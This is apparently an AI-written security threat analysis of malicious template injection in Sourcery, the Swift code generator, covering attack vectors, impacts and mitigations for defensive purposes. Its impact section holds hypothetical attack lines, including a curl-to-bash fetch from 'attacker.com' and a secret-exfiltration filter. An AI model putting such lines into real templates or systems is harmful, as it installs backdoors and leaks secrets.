Okay, here's a deep analysis of the "Malicious Template Injection" threat for a Sourcery-based application, following the structure you outlined:

# Deep Analysis: Malicious Template Injection in Sourcery

## 1. Objective

The primary objective of this deep analysis is to thoroughly understand the "Malicious Template Injection" threat, identify specific vulnerabilities and attack vectors, and propose concrete, actionable mitigation strategies beyond the initial high-level suggestions.  We aim to provide the development team with a clear understanding of *how* this attack could happen, *what* the specific consequences could be, and *how* to prevent it effectively.  This analysis will inform secure coding practices, code review checklists, and security testing procedures.

## 2. Scope

This analysis focuses specifically on the threat of malicious template injection within the context of using Sourcery for code generation.  The scope includes:

*   **Template Storage:**  How and where templates are stored (e.g., Git repository, dedicated storage).
*   **Template Access Control:**  Mechanisms for controlling who can access and modify templates.
*   **Template Parsing and Execution:**  The Sourcery code responsible for parsing and executing templates.
*   **Template Content:**  The types of code and logic that can be included within templates, and the potential for malicious exploitation.
*   **Generated Code:**  The impact of malicious template modifications on the generated code and the application's runtime behavior.
*   **Dependencies:** Any external libraries or tools used within the templates that could introduce vulnerabilities.
* **Sourcery Version:** We assume the latest stable version of Sourcery is used, but we will consider potential vulnerabilities in older versions if relevant.

This analysis *excludes* general application security threats unrelated to Sourcery's template processing.  It also excludes threats related to the compromise of developer workstations, unless that compromise directly leads to template injection.

## 3. Methodology

This analysis will employ the following methodologies:

*   **Code Review:**  Examination of the Sourcery source code (specifically the parsing and template execution logic) to identify potential vulnerabilities.
*   **Threat Modeling:**  Refinement of the existing threat model to explore specific attack scenarios and pathways.
*   **Vulnerability Research:**  Investigation of known vulnerabilities in similar template engines or code generation tools.
*   **Best Practices Review:**  Comparison of the current implementation against industry best practices for secure template handling.
*   **Proof-of-Concept (PoC) Exploration (Hypothetical):**  We will *describe* potential PoC attacks without actually executing them on a production system.  This helps illustrate the feasibility and impact of the threat.
*   **Documentation Review:**  Analysis of Sourcery's official documentation for security-related guidance and limitations.

## 4. Deep Analysis of the Threat

### 4.1. Attack Vectors and Scenarios

Several attack vectors could lead to malicious template injection:

*   **Compromised Repository Access:**
    *   **Scenario:** An attacker gains access to the Git repository (or other storage) containing the Sourcery templates through stolen credentials, a compromised developer account, a misconfigured access control list (ACL), or a vulnerability in the repository hosting platform (e.g., GitHub, GitLab, Bitbucket).
    *   **Details:** The attacker directly modifies existing templates or adds new malicious templates.
*   **Insider Threat:**
    *   **Scenario:** A malicious or negligent developer with legitimate access to the template repository intentionally or accidentally introduces malicious code into a template.
    *   **Details:** This bypasses initial access controls but highlights the need for strong code review and change management processes.
*   **Supply Chain Attack (Less Likely, but Possible):**
    *   **Scenario:**  If templates are sourced from a third-party (e.g., a public repository of shared templates), an attacker could compromise that third-party source and inject malicious code.
    *   **Details:** This is less likely with Sourcery, as templates are typically project-specific, but it's a consideration if external templates are used.
*   **Man-in-the-Middle (MitM) Attack (During Template Retrieval):**
    * **Scenario:** If templates are fetched from a remote source without proper verification (e.g., over an insecure connection), an attacker could intercept and modify the template in transit.
    * **Details:** This is less likely if templates are stored within the same repository as the main codebase, but it's relevant if templates are fetched from a separate, potentially less secure location.

### 4.2. Vulnerability Analysis (Sourcery Internals)

The core vulnerability lies in Sourcery's template parsing and execution mechanism.  While Sourcery is designed to generate code, the template language itself (Stencil or SwiftTemplate) might have features that, if misused, could lead to security issues.  We need to examine:

*   **`parseTemplates` Function:**  This function (and related parsing logic) is the entry point for template processing.  We need to understand how it handles:
    *   **Untrusted Input:**  Does it perform any sanitization or validation of the template content *before* parsing?
    *   **Error Handling:**  How does it handle errors during parsing?  Could a malformed template trigger unexpected behavior?
    *   **Context Isolation:**  Is the template execution context properly isolated from the Sourcery process itself?  Could a template access or modify Sourcery's internal state?
*   **Stencil/SwiftTemplate Features:**
    *   **Dynamic Code Execution:**  Does the template language allow for arbitrary code execution (e.g., through custom filters or tags)?  If so, this is a major vulnerability.
    *   **File System Access:**  Can templates read or write files on the system?  This could be used to exfiltrate data or install malicious code.
    *   **Network Access:**  Can templates make network requests?  This could be used for data exfiltration or command-and-control.
    *   **External Command Execution:** Can templates execute external commands or shell scripts? This is a critical vulnerability.
    *   **Template Inclusion:** How are included templates handled?  Could a malicious template include another malicious template from an untrusted source?
* **Known CVEs:** Search for any known Common Vulnerabilities and Exposures related to Sourcery or the underlying template engines.

### 4.3. Impact Analysis (Specific Examples)

The impact of a successful template injection attack can be severe and varied:

*   **Data Exfiltration:**
    *   **Example:** A template could be modified to include code that reads sensitive data from the application's configuration files or environment variables and sends it to an attacker-controlled server.
    *   **Stencil Example (Hypothetical):**  `{% if environment.SECRET_KEY %}{{ environment.SECRET_KEY | urlencode | send_to_attacker_server }}{% endif %}` (This assumes a hypothetical `send_to_attacker_server` filter, which highlights the need to prevent such custom filters.)
*   **Backdoor Installation:**
    *   **Example:** A template could generate code that creates a hidden user account with administrative privileges or opens a reverse shell to the attacker's machine.
    *   **SwiftTemplate Example (Hypothetical):**  `{% if build_config == "debug" %}` `system("curl http://attacker.com/backdoor.sh | bash")` `{% endif %}` (This highlights the danger of allowing system command execution.)
*   **Application Behavior Modification:**
    *   **Example:** A template could alter the generated code to bypass security checks, disable logging, or redirect users to a phishing site.
    *   **Stencil Example (Hypothetical):**  `{% if user.is_admin %}true{% else %}true{% endif %}` (This would bypass an admin check, granting all users admin privileges.)
*   **Denial of Service (DoS):**
    *   **Example:** A template could generate code that consumes excessive resources (CPU, memory, disk space), leading to a denial-of-service condition.
    *   **Stencil Example (Hypothetical):** `{% for i in 1...1000000000 %}{{ i }}{% endfor %}` (This could cause excessive memory allocation or CPU usage.)
* **Code Injection in Generated Code:** The most likely and dangerous outcome. The attacker can inject arbitrary Swift code that will be executed as part of the application.

### 4.4. Mitigation Strategies (Detailed)

The initial mitigation strategies are a good starting point, but we need to elaborate on them and add more specific recommendations:

*   **Strict Access Controls and MFA:**
    *   **Repository Level:** Use a Git hosting platform with robust access control features (e.g., branch protection rules, required reviewers, signed commits).  Enforce the principle of least privilege â€“ only grant write access to the template directory to authorized developers.  Enable multi-factor authentication (MFA) for *all* accounts with access to the repository.
    *   **Storage Level (if separate):** If templates are stored separately (e.g., in a cloud storage bucket), use strong authentication and authorization mechanisms provided by the storage provider.
*   **Mandatory Code Reviews (Security-Focused):**
    *   **Checklist:** Create a specific code review checklist for template changes that includes:
        *   Verification that no new potentially dangerous template features are being used (e.g., custom filters, file system access).
        *   Examination of any dynamic code generation within the template.
        *   Review of any external dependencies used within the template.
        *   Search for any patterns that resemble known attack vectors (e.g., attempts to access environment variables, execute system commands).
    *   **Two-Person Rule:** Require at least two developers to review and approve *all* template changes. One reviewer should have specific security expertise.
*   **Regular Security Audits:**
    *   **Automated Scanning:** Use automated vulnerability scanners to regularly scan the template repository for known vulnerabilities and misconfigurations.
    *   **Manual Audits:** Conduct periodic manual security audits of the repository, access controls, and template content.
*   **Separate, Highly Secured Repository:**
    *   **Dedicated Repository:** Store templates in a separate repository with stricter access controls and monitoring than the main application code repository.
    *   **Limited Access:**  Minimize the number of developers with write access to this repository.
*   **Code Signing for Templates (If Feasible):**
    *   **Digital Signatures:**  Use digital signatures to verify the integrity and authenticity of templates.  Sourcery would need to be modified to check these signatures before parsing a template. This is a more complex solution but provides strong protection against unauthorized modifications.
*   **Vulnerability Scanning and Dependency Management:**
    *   **Template Dependencies:**  If templates use any external libraries or tools, regularly scan them for vulnerabilities and keep them up-to-date.
    *   **Sourcery Itself:**  Monitor for security updates to Sourcery itself and apply them promptly.
*   **Template Linting:**
    *   **Custom Rules:**  Develop custom linting rules for Sourcery templates to detect common security issues, such as:
        *   Use of potentially dangerous template features.
        *   Access to sensitive environment variables.
        *   Patterns that resemble known attack vectors.
    *   **Integration with CI/CD:** Integrate template linting into the continuous integration/continuous delivery (CI/CD) pipeline to automatically flag potential security issues before they are deployed.
* **Input Validation and Sanitization (Within Sourcery):**
    * **Ideal Solution:** The *best* long-term solution is to modify Sourcery itself to perform input validation and sanitization on template content *before* parsing. This would prevent many of the hypothetical attack examples above. This might involve:
        * **Whitelisting:** Allow only a specific set of safe template features and tags.
        * **Blacklisting:** Block known dangerous patterns or functions.
        * **Contextual Escaping:** Automatically escape output based on the context (e.g., HTML, JavaScript) to prevent cross-site scripting (XSS) vulnerabilities in the generated code.
* **Runtime Monitoring:**
    * **Detect Anomalies:** Implement runtime monitoring to detect unusual behavior in the generated code, such as unexpected network connections, file system access, or system calls. This can help identify and mitigate attacks that have bypassed other security measures.
* **Sandboxing (If Feasible):**
    * **Isolated Environment:** Explore the possibility of running Sourcery in a sandboxed environment (e.g., a Docker container) with limited privileges. This would restrict the impact of a successful template injection attack. This is a more complex solution but provides a strong layer of defense.

## 5. Conclusion

Malicious template injection is a critical threat to applications using Sourcery.  The potential for arbitrary code execution makes it a high-priority security concern.  While strict access controls and code reviews are essential, the most robust defense involves modifying Sourcery itself to incorporate input validation, sanitization, and potentially sandboxing.  A layered approach, combining multiple mitigation strategies, is crucial to effectively protect against this threat. The development team should prioritize implementing the detailed mitigation strategies outlined above, focusing on both preventing unauthorized template modifications and limiting the potential impact of a successful injection. Continuous monitoring and security testing are also essential to ensure the ongoing effectiveness of these measures.
